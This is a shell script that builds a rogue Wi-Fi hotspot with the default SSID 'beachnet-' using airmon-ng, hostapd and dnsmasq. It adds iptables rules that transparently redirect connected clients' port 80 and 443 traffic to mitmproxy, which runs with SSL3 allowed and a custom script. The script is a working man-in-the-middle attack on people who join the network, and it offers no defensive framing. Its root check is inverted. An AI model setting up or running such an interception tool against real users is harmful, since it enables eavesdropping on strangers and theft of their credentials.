#!/bin/sh

# check if sudo
if [ "$EUID" = "0" ]; then
    echo "Please run script as root."
    exit
fi

check_progs() {
    echo "[*] checking if dependencies exist."
    [ -f /usr/bin/dnsmasq ] || echo "[-] dnsmasq not found." && exit
    [ -f /usr/bin/hostapd ] || echo "[-] hostapd not found." && exit
    [ -f /usr/bin/mitmproxy ] || echo "[-] mitmproxy not found." && exit
}
#check_progs

INTERNET_INTERFACE=wlan0
WIFI_INTERFACE=wlan1
if [ -f /usr/bin/fzf ]; then
    echo "choose the internet-connected network interface: "
    INTERNET_INTERFACE=$(ip a | grep -o '\<\S*w\S*\>' | sort -u | fzf --height=50% --layout=reverse)
    if [ "$INTERNET_INTERFACE" = "" ]; then
        exit
    fi

    echo "choose the access point interface: "
    WIFI_INTERFACE=$(ip a | grep -o '\<\S*w\S*\>' | sort -u | fzf --height=50% --layout=reverse)
    if [ "$WIFI_INTERFACE" = "" ]; then
        exit
    fi
fi

ip a | grep -q "$INTERNET_INTERFACE"
if [ ! "$?" = "0" ]; then
    echo "[-] INTERFACE error: invalid internet INTERFACE '$INTERNET_INTERFACE'";
    exit
fi
echo "[+] INTERFACE '$INTERNET_INTERFACE' validated.";

ip a | grep -q "$WIFI_INTERFACE"
if [ ! "$?" = "0" ]; then
    echo "[-] INTERFACE error: invalid wifi INTERFACE '$WIFI_INTERFACE'";
    exit
fi
echo "[+] INTERFACE '$WIFI_INTERFACE' validated.";

#airmon-ng check kill

airmon-ng start $WIFI_INTERFACE

ifconfig wlan1mon up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1


sed -i "s/\(interface=\)\(.*\)/\1${WIFI_INTERFACE}mon/" ./dnsmasq.conf ./hostapd.conf

echo -n "Enter ssid (default: 'beachnet-'): "
read ssid
if [ "$ssid" = "" ]; then
    ssid=beachnet-
fi
sed -i "s/\(ssid=\)\(.*\)/\1${ssid}/" ./hostapd.conf

firewall_set() {
	# $1: append or delete

	iptables --table nat --$1 POSTROUTING --out-interface $INTERNET_INTERFACE -j MASQUERADE
	iptables --$1 FORWARD --in-interface ${WIFI_INTERFACE}mon -j ACCEPT
	iptables --table nat --$1 PREROUTING -i ${WIFI_INTERFACE}mon -p tcp --dport 80 -j REDIRECT --to-port 8080
	iptables --table nat --$1 PREROUTING -i ${WIFI_INTERFACE}mon -p tcp --dport 443 -j REDIRECT --to-port 8080
	[ "$1" = "delete" ] && b=0 || b=1

	echo $b > /proc/sys/net/ipv4/ip_forward
};

firewall_set append

# will run programs in background.
# if debugging is desired, run the following alternatives:
# dnsmasq -C dnsmasq.conf -d
# hostapd hostapd.conf
dnsmasq -C dnsmasq.conf
hostapd -B hostapd.conf

# run mitm with either:
# mitmproxy or mitmweb
mitmproxy --set tls_version_client_min=SSL3 --mode transparent --showhost -s script.py

# cleanup
pkill mitmproxy || pkill mitmweb
pkill dnsmasq
pkill hostapd
firewall_set delete

airmon-ng stop $WIFI_INTERFACE

systemctl restart NetworkManager
